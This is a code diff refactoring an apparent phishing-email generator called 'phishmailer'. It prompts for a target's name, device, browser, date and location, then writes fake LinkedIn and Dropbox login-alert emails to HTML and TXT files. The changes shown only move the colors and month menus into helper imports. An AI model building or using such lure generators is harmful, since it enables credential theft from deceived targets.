@@ -1,21 +1,17 @@
 import os
 import sys
-
-red = ("\033[1;31;40m")
-green = ("\033[1;32;40m")
-white = ("\033[1;37;40m")
-blue = ("\033[1;34;40m")
-start = (green + "[" + white + "+" + green + "]" + white)
-alert = (green + "[" + red + "!" + green + "]" + white)
+from Core.helper.date import monthName
+from Core.helper.color import green, white, blue, start, alert, numbering
 
 def Custom():
 	global Device
 	global Browser
 	
 	print("")
-	print(start + " /Custom Pick\ ")
+	print(start + " /Custom Pick\\ ")
 	print(alert + " Enter Browser")
 	print("")
+	
 	Browser = input(green + "root@phishmailer/Device/Custom:~ ")
 	print(alert + " Enter Device")
 	Device = input("root@phishmailer/Device/Custom:~ ")
@@ -25,14 +21,14 @@ def AllNeed():
 	global Device
 	
 	print(start + " Pick The Options That Fits Your Attack: ")
-	print(green + "[" + white + "1" + green + "]" + blue + " Chrome" + white + "  »" + blue + " Windows" + white + " «")
-	print(green + "[" + white + "2" + green + "]" + blue + " Safari" + white + "  »" + blue + " IPhone" + white + "  «")
-	print(green + "[" + white + "3" + green + "]" + blue + " Edge" + white + "    »" + blue + " Windows" + white + " «")
-	print(green + "[" + white + "4" + green + "]" + blue + " Safari" + white + "  »" + blue + " MacOS" + white + "   «")
-	print(green + "[" + white + "5" + green + "]" + blue + " Firefox" + white + " »" + blue + " Linux" + white + "   «")
-	print(green + "[" + white + "6" + green + "]" + blue + " Chrome" + white + "  »" + blue + " Samsung" + white + " «")
-	print(green + "[" + white + "7" + green + "]" + blue + " Safari" + white + "  »" + blue + " IPad" + white + "    «")
-	print(green + "[" + white + "8" + green + "]" + white + "    »" + blue + " Custom" + white + " «")
+	print(numbering(1) + blue + " Chrome" + white + "  »" + blue + " Windows" + white + " «")
+	print(numbering(2) + blue + " Safari" + white + "  »" + blue + " IPhone" + white + "  «")
+	print(numbering(3) + blue + " Edge" + white + "    »" + blue + " Windows" + white + " «")
+	print(numbering(4) + blue + " Safari" + white + "  »" + blue + " MacOS" + white + "   «")
+	print(numbering(5) + blue + " Firefox" + white + " »" + blue + " Linux" + white + "   «")
+	print(numbering(6) + blue + " Chrome" + white + "  »" + blue + " Samsung" + white + " «")
+	print(numbering(7) + blue + " Safari" + white + "  »" + blue + " IPad" + white + "    «")
+	print(numbering(8) + white + "    »" + blue + " Custom" + white + " «")
 	print("")
 	DevicePick = int(input(green + "root@phishmailer/Device:~ " + white))
 	
@@ -81,52 +77,25 @@ def Linkedin():
 	Date = input(start + " Enter Date: ")
 	Country = input(start + " Enter Country: ")
 	City = input(start + " Enter City: ")
+	
 	print("")
 	print(start + " Enter Month When Login Happend")
-	print(green + "[" + white + "1" + green + "]" + white + " January")
-	print(green + "[" + white + "2" + green + "]" + white + " February")
-	print(green + "[" + white + "3" + green + "]" + white + " March")
-	print(green + "[" + white + "4" + green + "]" + white + " April")
-	print(green + "[" + white + "5" + green + "]" + white + " May")
-	print(green + "[" + white + "6" + green + "]" + white + " June")
-	print(green + "[" + white + "7" + green + "]" + white + " July")
-	print(green + "[" + white + "8" + green + "]" + white + " August")
-	print(green + "[" + white + "9" + green + "]" + white + " September")
-	print(green + "[" + white + "10" + green + "]" + white + " October")
-	print(green + "[" + white + "11" + green + "]" + white + " November")
-	print(green + "[" + white + "12" + green + "]" + white + " December")
+	print(numbering(1) + white + " January")
+	print(numbering(2) + white + " February")
+	print(numbering(3) + white + " March")
+	print(numbering(4) + white + " April")
+	print(numbering(5) + white + " May")
+	print(numbering(6) + white + " June")
+	print(numbering(7) + white + " July")
+	print(numbering(8) + white + " August")
+	print(numbering(9) + white + " September")
+	print(numbering(10) + white + " October")
+	print(numbering(11) + white + " November")
+	print(numbering(12) + white + " December")
 	print("")
-	monthpick = int(input(green + "root@phishmailer/month:~ " + white))
 	
-	if monthpick == 1:
-		month = ("January")
-	elif monthpick == 2:
-		month = ("February")
-	elif monthpick == 3:
-		month = ("March")
-	elif monthpick == 4:
-		month = ("April")
-	elif monthpick == 5:
-		month = ("May")
-	elif monthpick == 6:
-		month = ("June")
-	elif monthpick == 7:
-		month = ("July")
-	elif monthpick == 8:
-		month = ("August")
-	elif monthpick == 9:
-		month = ("September")
-	elif monthpick == 10:
-		month ("October")
-	elif monthpick == 11:
-		month = ("November")
-	elif month == 12:
-		month = ("December")
-	else:
-		print(alert + " Error")
-		time.sleep(1)
-		print(alert + " Exiting")
-		sys.exit()
+	monthpick = int(input(green + "root@phishmailer/month:~ " + white))
+	month = monthName(monthpick)
 	
 	AllNeed()
 	
@@ -270,6 +239,7 @@ def Linkedin():
 	Html_file.write(source)
 	Html_file.close()
 	print(alert + " HTML File Created")
+	
 	TXT_file = open(TXTname + ".txt","w")
 	TXT_file.write(source)
 	TXT_file.close()
@@ -279,52 +249,25 @@ def Dropbox():
 	Name = input(start + " Enter Target Name: ")
 	Time = input(start + " Enter Time pm/am (example 10:00pm): ")
 	Date = input(start + " Enter Date: ")
+	
 	print("")
 	print(start + " Enter Month When Login Happend")
-	print(green + "[" + white + "1" + green + "]" + white + " January")
-	print(green + "[" + white + "2" + green + "]" + white + " February")
-	print(green + "[" + white + "3" + green + "]" + white + " March")
-	print(green + "[" + white + "4" + green + "]" + white + " April")
-	print(green + "[" + white + "5" + green + "]" + white + " May")
-	print(green + "[" + white + "6" + green + "]" + white + " June")
-	print(green + "[" + white + "7" + green + "]" + white + " July")
-	print(green + "[" + white + "8" + green + "]" + white + " August")
-	print(green + "[" + white + "9" + green + "]" + white + " September")
-	print(green + "[" + white + "10" + green + "]" + white + " October")
-	print(green + "[" + white + "11" + green + "]" + white + " November")
-	print(green + "[" + white + "12" + green + "]" + white + " December")
+	print(numbering(1) + white + " January")
+	print(numbering(2) + white + " February")
+	print(numbering(3) + white + " March")
+	print(numbering(4) + white + " April")
+	print(numbering(5) + white + " May")
+	print(numbering(6) + white + " June")
+	print(numbering(7) + white + " July")
+	print(numbering(8) + white + " August")
+	print(numbering(9) + white + " September")
+	print(numbering(10) + white + " October")
+	print(numbering(11) + white + " November")
+	print(numbering(12) + white + " December")
 	print("")
-	monthpick = int(input(green + "root@phishmailer/month:~ " + white))
 	
-	if monthpick == 1:
-		month = ("January")
-	elif monthpick == 2:
-		month = ("February")
-	elif monthpick == 3:
-		month = ("March")
-	elif monthpick == 4:
-		month = ("April")
-	elif monthpick == 5:
-		month = ("May")
-	elif monthpick == 6:
-		month = ("June")
-	elif monthpick == 7:
-		month = ("July")
-	elif monthpick == 8:
-		month = ("August")
-	elif monthpick == 9:
-		month = ("September")
-	elif monthpick == 10:
-		month ("October")
-	elif monthpick == 11:
-		month = ("November")
-	elif month == 12:
-		month = ("December")
-	else:
-		print(alert + " Error")
-		time.sleep(1)
-		print(alert + " Exiting")
-		sys.exit()
+	monthpick = int(input(green + "root@phishmailer/month:~ " + white))
+	month = monthName(monthpick)
 	
 	print("")
 	Year = input(start + " Enter Year: ")
@@ -410,6 +353,7 @@ def Dropbox():
 	Html_file.write(source)
 	Html_file.close()
 	print(alert + " HTML File Created")
+	
 	TXT_file = open(TXTname + ".txt","w")
 	TXT_file.write(source)
 	TXT_file.close()
